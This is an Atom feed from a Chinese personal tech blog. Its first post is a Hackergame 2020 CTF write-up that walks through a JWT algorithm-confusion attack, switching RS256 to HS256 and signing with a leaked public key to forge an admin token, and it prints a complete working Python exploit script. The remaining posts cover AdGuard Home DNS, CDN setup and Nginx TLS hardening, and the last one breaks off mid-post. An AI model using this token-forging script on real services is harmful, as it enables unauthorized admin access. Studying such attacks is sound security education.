<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>BurgerBlog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://burgertown.tk/"/>
  <updated>2020-11-07T14:20:45.370Z</updated>
  <id>https://burgertown.tk/</id>
  
  <author>
    <name>BurgerTown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hackergame2020 普通的身份认证器 Write-up</title>
    <link href="https://burgertown.tk/2020/11/07/hackergame2020-jwt-exploit/"/>
    <id>https://burgertown.tk/2020/11/07/hackergame2020-jwt-exploit/</id>
    <published>2020-11-07T07:41:41.000Z</published>
    <updated>2020-11-07T14:20:45.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于-JWT"><a href="#关于-JWT" class="headerlink" title="关于 JWT"></a>关于 JWT</h2><p><del>毕竟是面向搜索引擎的比赛嘛 多搜搜</del></p><p>下面的链接给出了介绍了 JWT 与给出了几种 JWT 的攻击方法</p><p><a href="https://0clickjacking0.github.io/2019/07/09/JWT-JSON-Web-Token-%E6%94%BB%E5%87%BB/">JWT(JSON Web Token) 攻击</a></p><h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p>打开题目页面只有两个按钮，按 F12 打开开发者面板，切到<code>网络</code>选项页</p><p>点击<code>以 Guest 登陆</code>，观察网络请求</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107160650.png" alt="20201107160650"></p><p>将<code>Hg-Token: 比赛 Token</code>加入<code>Headers</code>，<code>POST</code>到 <code>/token</code> 来进行登陆</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107160917.png" alt="20201107160917"></p><p>得到<code>access_token</code>和<code>token_type</code></p><p>用<code>base64</code>解码登陆后的返回的 JWT，可知此 JWT 使用 RS256 加密</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107161147.png" alt="20201107161147"></p><p>根据上文所提到的攻击方法，对待 RS256 加密，只有</p><ol><li>将加密降级为 none</li><li>将加密降级为 HS256</li></ol><p>手动或者使用 <a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a> 来进行构造一个新的<code>headers</code>和<code>payload</code> 进行第一种加密的攻击，失败</p><h2 id="然后呢"><a href="#然后呢" class="headerlink" title="然后呢"></a>然后呢</h2><p>既然第一种方法不行 那么就只剩下将算法改为 HS256，以公钥作为密钥进行降级攻击了</p><p>但是很明显手上所拥有的信息中没有公钥</p><p>这时候读一下页面的源码，看看有没有什么收获</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107161703.png" alt="20201107161703"></p><p>发现此网站由 FastAPI 做后端，于是开始搜索 FastAPI 与 JWT 的相关内容</p><p>无有用信息</p><p>于是只搜索 FastAPI 的相关攻击 于是搜到这样一篇</p><p><a href="https://lazzzaro.github.io/2020/10/25/match-CTFshow-1024%E6%9D%AF/">CTFshow 1024 杯</a></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107161946.png" alt="20201107161946"></p><p>发现里面提到了 FastAPI 有交互式的 API 页面，于是马上回到比赛页面，进入<code>/docs</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107162042.png" alt="20201107162042"></p><p>点开<code>/debug</code>，<code>execute</code>后出现了<code>PUBLIC_KEY</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107162159.png" alt="20201107162159"></p><p>这时候就可以开始构造攻击脚本了</p><h2 id="构造攻击脚本"><a href="#构造攻击脚本" class="headerlink" title="构造攻击脚本"></a>构造攻击脚本</h2><p>首先要通过登陆来获得没有过期的 token（其实不必须</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REQUEST = requests.Session()</span><br><span class="line">headers = &#123;<span class="string">&#x27;Hg-Token&#x27;</span>: token&#125;</span><br><span class="line">REQUEST.headers.update(headers)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    request = REQUEST.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>token&#x27;</span>).json()</span><br><span class="line">    <span class="keyword">return</span> request[<span class="string">&#x27;access_token&#x27;</span>], request[<span class="string">&#x27;token_type&#x27;</span>]</span><br></pre></td></tr></table></figure><p>对其<code>access_token</code>进行<code>base64</code>解码，将<code>payload</code>部分解析成字典，记得要补全等号才能正常解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload_base64 = <span class="built_in">bytes</span>(access_token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">missing_padding = <span class="built_in">len</span>(payload_base64) % <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">    payload_base64 += <span class="string">b&#x27;=&#x27;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line">payload = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.decodebytes(payload_base64), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>然后将其<code>payload</code>里的<code>sub</code>的值改成 <code>admin</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload[<span class="string">&#x27;sub&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure><p>同时别忘了要获取公钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_public_key</span>():</span></span><br><span class="line">    <span class="keyword">return</span> REQUEST.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>debug&#x27;</span>).json()[<span class="string">&#x27;PUBLIC_KEY&#x27;</span>]</span><br></pre></td></tr></table></figure><p>最后就是将这套构造后的<code>payload</code>使用 HS256 算法，公钥作为密钥来进行加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt_token = <span class="built_in">str</span>(jwt.encode(payload, key=public_key,algorithm=<span class="string">&#x27;HS256&#x27;</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br></pre></td></tr></table></figure><p>将这个<code>JWT</code>加入到<code>headers</code>里进行请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers[<span class="string">&#x27;Authorization&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;token_type&#125;</span> <span class="subst">&#123;jwt_token&#125;</span>&#x27;</span></span><br><span class="line">REQUEST.headers.update(headers)</span><br><span class="line">print(REQUEST.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>profile&#x27;</span>).json())</span><br></pre></td></tr></table></figure><h2 id="等等，报错了"><a href="#等等，报错了" class="headerlink" title="等等，报错了"></a>等等，报错了</h2><p>如无意外，直接运行会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</span><br></pre></td></tr></table></figure><p>因为一般版本的 <code>PyJWT</code> 库会对密钥进行检验</p><p>会过滤掉以<code>-----BEGIN RSA PUBLIC KEY-----</code>此类开头的的密钥</p><p>结合第一篇文给的建议和题目给的提示</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107163740.png" alt="20201107163740"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyjwt==0.4.3</span><br></pre></td></tr></table></figure><p>装好这个版本的<code>PyJWT</code>库后再跑一遍就可以得到 flag 了</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>其实根据<code>FastAPI JWT</code>搜索出来的 FastAPI 的文档里有个小细节</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20201107163956.png" alt="20201107163956"></p><h2 id="完整的攻击脚本"><a href="#完整的攻击脚本" class="headerlink" title="完整的攻击脚本"></a>完整的攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">token = <span class="string">&#x27;&#x27;</span></span><br><span class="line">REQUEST = requests.Session()</span><br><span class="line">headers = &#123;<span class="string">&#x27;Hg-Token&#x27;</span>: token&#125;</span><br><span class="line">REQUEST.headers.update(headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    request = REQUEST.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>token&#x27;</span>).json()</span><br><span class="line">    <span class="keyword">return</span> request[<span class="string">&#x27;access_token&#x27;</span>], request[<span class="string">&#x27;token_type&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_public_key</span>():</span></span><br><span class="line">    <span class="keyword">return</span> REQUEST.post(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>debug&#x27;</span>).json()[<span class="string">&#x27;PUBLIC_KEY&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    access_token, token_type = login()</span><br><span class="line">    payload_base64 = <span class="built_in">bytes</span>(access_token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    missing_padding = <span class="built_in">len</span>(payload_base64) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> missing_padding != <span class="number">0</span>:</span><br><span class="line">        payload_base64 += <span class="string">b&#x27;=&#x27;</span> * (<span class="number">4</span> - missing_padding)</span><br><span class="line">    payload = <span class="built_in">eval</span>(<span class="built_in">str</span>(base64.decodebytes(payload_base64), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    payload[<span class="string">&#x27;sub&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    public_key = get_public_key()</span><br><span class="line">    jwt_token = <span class="built_in">str</span>(jwt.encode(payload, key=public_key,</span><br><span class="line">                               algorithm=<span class="string">&#x27;HS256&#x27;</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    headers[<span class="string">&#x27;Authorization&#x27;</span>] = <span class="string">f&#x27;<span class="subst">&#123;token_type&#125;</span> <span class="subst">&#123;jwt_token&#125;</span>&#x27;</span></span><br><span class="line">    REQUEST.headers.update(headers)</span><br><span class="line">    print(REQUEST.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>profile&#x27;</span>).json())</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      面向搜索引擎做题的心路历程
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Network" scheme="https://burgertown.tk/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>使用 AdGuard Home 搭建自己的过滤广告 DNS 服务器</title>
    <link href="https://burgertown.tk/2019/09/02/use-Adguard-Home-to-build-a-DoH-server/"/>
    <id>https://burgertown.tk/2019/09/02/use-Adguard-Home-to-build-a-DoH-server/</id>
    <published>2019-09-02T13:34:20.000Z</published>
    <updated>2019-09-29T18:08:42.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="给出我搭建的（已弃用）"><a href="#给出我搭建的（已弃用）" class="headerlink" title="给出我搭建的（已弃用）"></a>给出我搭建的（已弃用）</h2><p><strong>由于此项服务极其不稳定 两个节点现已弃用</strong></p><p>基于安全的考虑 我所搭建的只提供 DNS-over-Https 服务 且都不是中国大陆服务器</p><p>地址：</p><ul><li><del>香港：<a href="https://doh-hk.burgertown.tk/dns-query">https://doh-hk.burgertown.tk/dns-query</a></del></li><li><del>美国：<a href="https://doh-us.burgertown.tk/dns-query">https://doh-us.burgertown.tk/dns-query</a></del></li></ul><p>开启了以下的过滤：</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20190902214321.png" alt="20190902214321"></p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><ul><li>从 <a href="https://github.com/AdguardTeam/AdGuardHome">AdGuard Home 的 Github 项目地址</a> 中下载最新的 <a href="https://github.com/AdguardTeam/AdGuardHome/releases">releases</a></li><li>解压</li><li>用命令行进入目录</li><li>执行二进制</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/AdguardTeam/AdGuardHome/releases/download/v0.98.1/AdGuardHome_linux_amd64.tar.gz</span><br><span class="line">tar -xzf AdGuardHome_linux_amd64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> AdGuardHome_linux_amd64.tar.gz</span><br><span class="line">./AdGuardHome</span><br></pre></td></tr></table></figure><h2 id="第一次配置"><a href="#第一次配置" class="headerlink" title="第一次配置"></a>第一次配置</h2><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/20190902221541.png" alt="20190902221541"></p><p>根据所输出的信息 使用浏览器打开指定页面</p><p><code>Admin Web Interface</code>选择允许访问管理界面的接口 <code>DNS server</code>选择允许接入 DNS 服务器的接口</p><p>下一步<code>Authentication</code>里填入用户名和密码 用于管理界面的验证</p><p>然后会自动跳转到管理界面 这时输入刚刚设置的用户名和密码</p><h2 id="DNS-配置"><a href="#DNS-配置" class="headerlink" title="DNS 配置"></a>DNS 配置</h2><p>在<code>上游 DNS 服务器</code>中填入你所希望使用的上游 DNS 服务器 支持<code>DoH/DoT/UDP/TCP 等</code></p><p>但既然使用了支持<code>DoH</code>和<code>DoT</code>的客户端 为什么还要用<code>UDP</code>和<code>TCP</code>呢</p><p>这里给出两个的不错的国内加密 DNS 提供商</p><ul><li><a href="https://233py.com">GeekDNS</a>: 大陆就提供了 4 个服务器 爽到 还有香港、美国的</li><li><a href="https://www.rubyfish.cn/">红鱼 DNS</a>: 大陆暂时只有 <a href="https://www.rubyfish.cn/server">华东</a> 的节点 对于华南的我不太友好 LOL</li></ul><p><code>Bootstrap DNS 服务器</code>是用于解析<code>DoH</code>和<code>DoT</code>服务器的 IP 的 这样尽量确保不被污染</p><h2 id="加密设置"><a href="#加密设置" class="headerlink" title="加密设置"></a>加密设置</h2><p>如果需要开启加密 DNS 服务 就在这里设置</p><p><code>服务器名称</code>输入域名 然后什么端口 证书的 没什么难度 就不说了</p><p>我曾经在 <a href="/2017/07/11/Https-Nginx-Hexo-Git/#%E9%80%89%E6%8B%A9SSL%E8%AE%A4%E8%AF%81%E6%9C%BA%E6%9E%84%E4%B8%8E%E5%9F%9F%E5%90%8D%E6%89%98%E7%AE%A1%E6%9C%BA%E6%9E%84">Https Nginx Hexo Git</a> 文中提到相关的 可以参考一下</p><h2 id="过滤器设置"><a href="#过滤器设置" class="headerlink" title="过滤器设置"></a>过滤器设置</h2><p>看 <a href="#给出我搭建的">给出我搭建的</a>的图 我建议就开这几个 当然每个人都可以自己自定义自己的过滤器</p><p>有人给出了一些不错的去广告 host 项目 <a href="https://github.com/otobtc/ADhosts">ADhosts</a></p><p>自行在上面选择对应的项目的 host 文件地址填入 AdGuard Home 即可</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>有什么不懂的可以直接在评论里留言</p>]]></content>
    
    <summary type="html">
    
      Build Your Own World
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="Https" scheme="https://burgertown.tk/tags/Https/"/>
    
      <category term="DNS" scheme="https://burgertown.tk/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>使用 CDN 加速博客的访问速度</title>
    <link href="https://burgertown.tk/2019/07/20/use-cdn-to-accelerate-blog/"/>
    <id>https://burgertown.tk/2019/07/20/use-cdn-to-accelerate-blog/</id>
    <published>2019-07-20T08:57:51.000Z</published>
    <updated>2019-09-29T18:08:49.184Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用公共-CDN-加速开源库"><a href="#使用公共-CDN-加速开源库" class="headerlink" title="使用公共 CDN 加速开源库"></a>使用公共 CDN 加速开源库</h2><p>本博客使用 NexT 所以以 NexT 的配置文件为主 打开主题目录下的配置文件<code>_config.yml</code></p><p>在配置文件底部的<code>vendors</code>下填入各开源库使用的 CDN 链接</p><p>这里推荐一个 <a href="http://staticfile.org/">Staticfile CDN</a> 虽然主页看起来好几年没更新 但库还是新的</p><p>直接搜索库名然后填入配置文件中即可</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzILlV.png" alt="ZzILlV.png"></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzIIoj.png" alt="ZzIIoj.png"></p><h2 id="使用私有-CDN-加速私有静态文件"><a href="#使用私有-CDN-加速私有静态文件" class="headerlink" title="使用私有 CDN 加速私有静态文件"></a>使用私有 CDN 加速私有静态文件</h2><p>本博客的服务商是腾讯云 所以这里以腾讯云做示范</p><p>先开通<code>对象存储</code>与<code>内容分发网络</code>这两个服务 新人有免费试用</p><h3 id="对象存储"><a href="#对象存储" class="headerlink" title="对象存储"></a>对象存储</h3><p>在腾讯云的控制台中点开<code>对象存储</code> 点击<code>创建存储桶</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzoQpt.png" alt="ZzoQpt.png"></p><p>自行设置好名称与地域后确认</p><p>打开主题目录下的配置文件<code>_config.yml</code> 修改最末尾的<code># Assets</code>部分</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzTwUH.png" alt="ZzTwUH.png"></p><p><strong>记住这里是。file 而不是。cos-ap 因为等一下要开启 CDN CDN 的域名与存储桶的域名并不一样</strong></p><p>修改完后保存<code>Hexo g</code> 生成静态文件</p><p>将<code>public</code>目录下的<code>css\js\images</code>文件夹上传到存储桶</p><h3 id="内容分发网络"><a href="#内容分发网络" class="headerlink" title="内容分发网络"></a>内容分发网络</h3><p>存储桶页面点击<code>域名管理</code>-&gt;<code>默认加速域名</code>旁的<code>编辑</code> 打开<code>开关</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzTWVg.png" alt="ZzTWVg.png"></p><p>然后<code>保存</code></p><p>然后也没什么好说的 只需要注意** CDN 的域名与存储桶的域名并不一样**</p><p>其他的高级设置因人而异 所以到此为止</p><h2 id="使用-DNS-海内外分流加速"><a href="#使用-DNS-海内外分流加速" class="headerlink" title="使用 DNS 海内外分流加速"></a>使用 DNS 海内外分流加速</h2><h3 id="GitHub-Pages"><a href="#GitHub-Pages" class="headerlink" title="GitHub Pages"></a>GitHub Pages</h3><p>很多人会在自己服务器上部署一个 Web 服务器同时部署一个 <a href="https://pages.github.com/">Github Pages</a></p><p>众所周知 Github 的服务器在海外 那么海外访问直接导向 Github Pages 体验会更好</p><p>怎么配置 Github Pages 跟 Hexo 就不说了 直接进入如何配置 DNS 与 Github Pages</p><p>进入 Github 里 Github Pages 相对应的仓库 点击<code>Settings</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Zz7Msf.png" alt="Zz7Msf.png"></p><p>拉到<code>Github Pages</code>部分</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Zz7wLT.png" alt="Zz7wLT.png"></p><p><code>Custom domain</code>输入想要分流自己的域名 然后<code>Save</code></p><p>进入 DNS 服务商的管理页面 新建一个记录</p><p><code>主机记录</code>对应<code>Custom domain</code> <code>记录类型</code>选择<code>CNAME</code> <code>线路</code>选择<code>境外</code></p><p><code>记录值</code>填入<code>Github Pgaes</code>的域名<code>*.github.io</code> <code>保存</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Zz7Wy6.png" alt="Zz7Wy6.png"></p><h3 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h3><p><code>Cloudflare</code>官网不支持 CNAME 方式接入 所以我们要使用<code>Cloudflare&#39;s Partner</code>来接入我们的域名</p><p>先在<code>Cloudflare</code>官网注册一个帐号 然后进入一个<code>Cloudflare&#39;s Partner</code>的网站</p><p>这里推荐一个<code>https://cdn.wzfou.com/</code> 使用<code>Cloudflare</code>帐号登陆</p><p><code>新增域名</code>填入自己的主域名 即<code>xxx.xx</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzH9Yj.png" alt="ZzH9Yj.png"></p><p><code>管理 DNS</code>-&gt;<code>DNS 管理</code>-&gt;<code>添加记录</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzHGnK.png" alt="ZzHGnK.png"></p><p><code>记录名称</code>与上面的<code>主机记录</code>一样 填入要接入的域名</p><p><strong>但这里<code>记录类型</code>为<code>A</code> <code>记录内容</code>为<code>服务器真实 IP</code> <code>CDN</code>为<code>开</code> 就可以<code>提交</code>了</strong></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzHgAg.png" alt="ZzHgAg.png"></p><p>回到管理页面 复制<code>CNAME 设置</code>里对应域名的<code>CNAME</code></p><p>进入 DNS 服务商的管理页面 新建一个记录</p><p><code>主机记录</code>对应上面<code>记录类型</code> <code>记录类型</code>选择<code>CNAME</code> <code>线路</code>选择<code>境外</code></p><p><code>记录值</code>填入上面<code>CNAME 设置</code>里对应域名的<code>CNAME</code> <code>保存</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZzbVgI.png" alt="ZzbVgI.png"></p><p>进入 <a href="https://www.cloudflare.com/">Cloudflare</a> 的官网 登陆 点击刚刚<code>接入的域名</code> 选择<code>Cacheing</code></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Zzb054.png" alt="Zzb054.png"></p><p>在<code>Cacheing Level</code>中选择<code>Standard</code></p><h3 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h3><p><a href="http://tool.chinaz.com/sitespeed">站长工具 -&gt; 网站速度测试</a></p><p><a href="http://www.webkaka.com/">卡卡网</a></p><p>可以根据国内外的测试判断 CDN 是否生效</p><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://11.tt/posts/2018/set-up-cdn-for-hexo/">使用 CDN 让你的 Hexo 博客拥有飞一般的体验</a></p>]]></content>
    
    <summary type="html">
    
      跟上时代的步伐 Part.4
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Web" scheme="https://burgertown.tk/tags/Web/"/>
    
      <category term="CDN" scheme="https://burgertown.tk/tags/CDN/"/>
    
  </entry>
  
  <entry>
    <title>在 SSL Lab 中达到 A+评分的 Nginx 配置</title>
    <link href="https://burgertown.tk/2019/07/19/achieve-A-on-SSL-Labs-with-Nginx/"/>
    <id>https://burgertown.tk/2019/07/19/achieve-A-on-SSL-Labs-with-Nginx/</id>
    <published>2019-07-19T01:28:03.000Z</published>
    <updated>2019-09-29T18:20:07.874Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前情"><a href="#前情" class="headerlink" title="前情"></a>前情</h2><p>曾经在 <a href="/2017/07/11/Https-Nginx-Hexo-Git/">这里</a> 讲述了如何用 acme.sh 申请 RSA 证书并开启 Https</p><p>本文参考了 <a href="https://medium.com/@aditya.vssut/setting-up-nginx-configuration-to-get-an-a-in-ssl-labs-server-test-e0e25098d634">How to get an ‘A+’ in SSL Labs Server Test with NginX configuration</a> 所以也可以认为是一个大致的汉化</p><p><strong>但是原文发布于 2018/10/8 某些地方可能已经过时</strong></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/ZjbGYn.png" alt="ZjbGYn.png"></p><p>可以看到 SSL Lab 的评判有四方面 这里一个个说</p><h2 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h2><blockquote><p>This section is fairly easy to get 100% on. Use a well known or trusted CA(Certificate Authority) and make sure your certificate and chain are in the correct order. The most important certificate configuration setting is the fingerprint hashing algorithm. Ensure that you have created a SHA256-signed certificate and not SHA1. Until recently, most certificates were signed using SHA1. However, its becoming dangerously insecure as computing power advances. In its place, new certificates should be signed using SHA256.</p></blockquote><p>简单来说就是只需要有一个受信任的 CA 签发、加密算法不是 SHA1 的证书即可</p><p>所以这里只需要使用 acme.sh 生成证书就可以达到 100%</p><h2 id="Protocol-Support"><a href="#Protocol-Support" class="headerlink" title="Protocol Support"></a>Protocol Support</h2><blockquote><p>Disable SSLv3<br>By default Nginx still enables SSLv3, which has been vulnerable to the POODLE attack since October 2014. SSL Labs rightly limits your server’s SSL score to C if SSLv3 is enabled, so this is the first thing to change.<br>Using only TLSv1.2<br>If you want to score 100% in this section, you will have to use only TLSv1.2 as your supported SSL protocols. However, most of the older clients will not able to load your site.<br>Using TLSv1.1&amp;v1.2<br>Using TLSv1.1 &amp; v1.2 will get you a score of 95% in this section, but some of the older clients will still not be able to load your site.<br>Use TLS1.0~1.2<br>Although using this suite will give you a score of 90%, this would be the best compatible option suggested by me, and you will still be able to score an overall ‘A+’. Don’t use protocols older than TLS1.0 since it’s been deprecated.</p></blockquote><p>这里原作者给出了几个解决方案</p><p>但是首先 禁用 SSLv3</p><p>默认情况下 Nginx 还是会启用 SSLv3 但是此协议被 <a href="https://www.us-cert.gov/ncas/alerts/TA14-290A">证实是有漏洞</a> 的</p><h3 id="仅启用-TLS-v1-2"><a href="#仅启用-TLS-v1-2" class="headerlink" title="仅启用 TLS v1.2"></a>仅启用 TLS v1.2</h3><p>这样可以达到 100% 但是某些老的客户端会有兼容性问题</p><h3 id="同时启用-TLSv1-1-和-TLS-v1-2"><a href="#同时启用-TLSv1-1-和-TLS-v1-2" class="headerlink" title="同时启用 TLSv1.1 和 TLS v1.2"></a>同时启用 TLSv1.1 和 TLS v1.2</h3><p>达到 95% 同时保持某些老客户端的兼容</p><h3 id="同时启用-TLS-v1-0-TLSv1-1-和-TLS-v1-2"><a href="#同时启用-TLS-v1-0-TLSv1-1-和-TLS-v1-2" class="headerlink" title="同时启用 TLS v1.0 TLSv1.1 和 TLS v1.2"></a>同时启用 TLS v1.0 TLSv1.1 和 TLS v1.2</h3><p>这样会有 90% 同时保持最大的兼容性</p><h3 id="我的建议"><a href="#我的建议" class="headerlink" title="我的建议"></a>我的建议</h3><p>但其实 TLS v1.0 和 TLSv1.1 现已被 SSL Lab 打上了黄色 所以我建议<em>同时启用 TLS v1.2 和 TLS v1.3</em></p><p>如何开启 TLS v1.3? <a href="/2019/07/18/compile-Nginx-on-CentOS-7-to-enable-TLS1-3/">在 CentOS 7 上编译 Nginx 使其启用 TLS v1.3</a></p><p>Nginx 配置如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl_protocols TLSv1.2 TLSv1.3;</span><br></pre></td></tr></table></figure><h2 id="Key-Exchange"><a href="#Key-Exchange" class="headerlink" title="Key Exchange"></a>Key Exchange</h2><blockquote><p>To increase the Key Exchange score, we need to increase the size of the key used in the DH exchange. Nginx uses OpenSSL’s default 1024 bit key size as an input to the DH key exchange, resulting in a 1024 bit key. Ideally, we should be using a key number smaller than our SSL certificate which is commonly 2048 or even 4096 bits.</p></blockquote><p>要提高<code>Key Exchange</code>的分数 就要提高用于 DH 交换的密钥的位数 Nginx 默认使用 1024 位的密钥来作 DH 交换</p><p>所以要提高分数 就需要将其提升至 2048 位甚至是 4096 位</p><p>执行以下代码来生成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl dhparam -out /etc/nginx/dhparam.pem 4096</span><br></pre></td></tr></table></figure><p>生成过程可能会长达几分钟 所以你想的话也可以降低位数到 2048 然后需要配置 Nginx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl_dhparam /etc/nginx/dhparam.pem;</span><br></pre></td></tr></table></figure><h2 id="Cipher-Strength"><a href="#Cipher-Strength" class="headerlink" title="Cipher Strength"></a>Cipher Strength</h2><p>这里原文写了一大堆算法 